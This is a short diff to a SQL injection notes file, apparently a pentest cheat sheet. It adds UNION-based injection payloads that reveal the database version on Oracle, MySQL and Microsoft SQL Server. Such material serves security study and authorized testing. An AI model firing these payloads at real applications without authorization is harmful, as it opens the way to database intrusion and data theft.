@@ -1,5 +1,19 @@
 # SQL Injection 
 
+
+**Database version**
+
+for oracle---
+'+UNION+SELECT+'abc','def'+FROM+dual--
+'+UNION+SELECT+BANNER,+NULL+FROM+v$version--
+
+for MySQL and Microsoft---
+'+UNION+SELECT+'abc','def'#
+'+UNION+SELECT+@@version,+NULL#
+
+
+
+
 ## Summary
 
 * [Recon for SQLi Vulnerabilities](#recon)
